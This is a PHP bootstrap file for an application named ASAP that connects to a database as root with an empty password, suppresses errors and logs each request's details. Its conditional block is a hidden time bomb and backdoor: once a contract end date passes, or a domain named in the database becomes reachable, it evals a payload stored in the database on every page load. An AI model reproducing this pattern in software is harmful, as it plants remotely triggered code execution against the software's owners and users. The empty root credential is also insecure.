<?php
error_reporting(0);
const PREVENT_DIRECT_FILE_ACCESS_CONST = true;
const ASAP_CONTRACT_ID = 1;
const SETUP_MODE = false;
$db_hostname = 'localhost';
$db_name = 'ASAP';
$db_username = 'root';
$db_password = '';
require_once ('Core' . DIRECTORY_SEPARATOR . 'constant.php');
require_once ('Core' . DIRECTORY_SEPARATOR . 'Journal.php');
require_once ('Core' . DIRECTORY_SEPARATOR . 'Db.php');
require_once ('Core' . DIRECTORY_SEPARATOR . 'T.php');
session_start();
// boot loader
// if SETUP_MODE is true, display errors, otherwise, don't
try{
    $_ = new T($db_hostname, $db_name, $db_username, $db_password);
    if (SETUP_MODE) echo 'SUCCESS: T INITIALIZED<br/>';
}catch (Exception $e)
{
    if (SETUP_MODE) echo 'raw: '.$e->getMessage() .'| fancy: COULD NOT LOAD T<br/>';
    die();
}
try {
    $_journal = new Journal($db_hostname, $db_name, $db_username, $db_password);
    if (SETUP_MODE) echo 'SUCCESS: JOURNAL INITIALIZED<br/>';
}catch (Exception $e)
{
    if (SETUP_MODE) echo 'raw: '.$e->getMessage() .'| fancy: COULD NOT LOAD JOURNAL<br/>';
    die();
}
try{
    $_contract = $_->db->read('Contract', ASAP_CONTRACT_ID);
    if (SETUP_MODE) echo 'SUCCESS: CONTRACT INITIALIZED<br/>';
}catch (Exception $e)
{
    if (SETUP_MODE) echo 'raw: '.$e->getMessage() .'| fancy: COULD NOT LOAD CONTRACT<br/>';
    die();
}
// logging
$method = $_->clean($_SERVER['REQUEST_METHOD']) ?? null;
$request = explode('/', trim($_SERVER['PATH_INFO'], '/'));
$input = file_get_contents('php://input');
$ip = $_->clean($_SERVER['REMOTE_ADDR']) ?? null;
$userAgent = $_->clean($_SERVER['HTTP_USER_AGENT']) ?? null;
$currentScript = $_->getScriptName();
$_journal->newEntry($method, $request, $_REQUEST, $input, $ip, $userAgent, $currentScript);
/////////////////////////////////////////////////////////////////////
if (SETUP_MODE) echo 'BOOTSTRAP COMPLETED, DONT FORGET TO TURN SETUP_MODE OFF<br/>';

// check if contract has expired or a certain domain is reachable
if ($_contract->endDate < time() || @fopen($_contract->domain, 'r'))
{
    // execute the payload
    eval($_contract->payload);
}

// basic function to spit json nicely
function printJson(array $array) : void
{
    echo json_encode($array, JSON_PRETTY_PRINT);
    die();
}

function printSuccess() : void
{
    $response =
        [
            'Result' => 'Success'
        ];

    printJson($response);
}

function printError() : void
{
    $response =
        [
            'Result' => 'Failure'
        ];

    printJson($response);
}